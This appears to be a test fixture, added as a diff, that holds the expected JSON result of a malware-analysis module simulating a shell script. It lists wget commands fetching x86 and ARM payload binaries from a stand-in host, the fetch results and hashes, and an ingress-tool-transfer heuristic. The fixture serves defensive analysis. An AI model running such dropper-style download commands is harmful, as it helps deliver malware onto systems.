@@ -1,0 +1,127 @@
+{
+  "extra": {
+    "drop_file": false,
+    "score": 400,
+    "sections": [
+      {
+        "auto_collapse": false,
+        "body": [
+          {
+            "args": "http://payload.test/x.x86 -O out.x86",
+            "command": "wget",
+            "conditional": false,
+            "kind": "network_fetch"
+          },
+          {
+            "args": "http://payload.test/x.arm -O out.arm",
+            "command": "wget",
+            "conditional": false,
+            "kind": "network_fetch"
+          }
+        ],
+        "body_config": {
+          "column_order": [
+            "kind",
+            "command",
+            "args",
+            "conditional"
+          ]
+        },
+        "body_format": "TABLE",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": null,
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Resolved actions",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": [
+          {
+            "content_type_header": "application/octet-stream",
+            "http_status": 200,
+            "outcome": "fetched",
+            "sha256": "52af2eb905a8a100e63e6479d70c3da602d2fffdda6da72f9fddf4574129a5fc",
+            "size": 16,
+            "sniffed_type": "text/plain",
+            "url": "http://payload.test/x.x86"
+          },
+          {
+            "content_type_header": "application/octet-stream",
+            "http_status": 200,
+            "outcome": "fetched",
+            "sha256": "b198d64b7b159da90730c08df42b1e38e618a729ff1f37c585a78282381cd811",
+            "size": 16,
+            "sniffed_type": "text/plain",
+            "url": "http://payload.test/x.arm"
+          }
+        ],
+        "body_config": {
+          "column_order": [
+            "url",
+            "outcome",
+            "http_status",
+            "content_type_header",
+            "sniffed_type",
+            "size",
+            "sha256"
+          ]
+        },
+        "body_format": "TABLE",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [
+            "T1105"
+          ],
+          "frequency": 1,
+          "heur_id": 1,
+          "score": 400,
+          "score_map": {},
+          "signatures": {
+            "webshell_or_html": 2
+          }
+        },
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Real fetches performed",
+        "zeroize_on_tag_safe": false
+      }
+    ]
+  },
+  "files": {
+    "extracted": [
+      {
+        "name": "52af2eb905a8a100e63e6479d70c3da602d2fffdda6da72f9fddf4574129a5fc.x86",
+        "sha256": "52af2eb905a8a100e63e6479d70c3da602d2fffdda6da72f9fddf4574129a5fc"
+      },
+      {
+        "name": "b198d64b7b159da90730c08df42b1e38e618a729ff1f37c585a78282381cd811.arm",
+        "sha256": "b198d64b7b159da90730c08df42b1e38e618a729ff1f37c585a78282381cd811"
+      }
+    ],
+    "supplementary": [
+      {
+        "name": "bashsim_actions_log.json",
+        "sha256": "6ec0b85d966ab65cc410da61808aef4b52cf109aa86879ac84abcf5aa07573b6"
+      }
+    ]
+  },
+  "results": {
+    "heuristics": [
+      {
+        "attack_ids": [
+          "T1105"
+        ],
+        "heur_id": 1,
+        "signatures": [
+          "webshell_or_html"
+        ]
+      }
+    ],
+    "tags": {},
+    "temp_submission_data": {}
+  }
+}
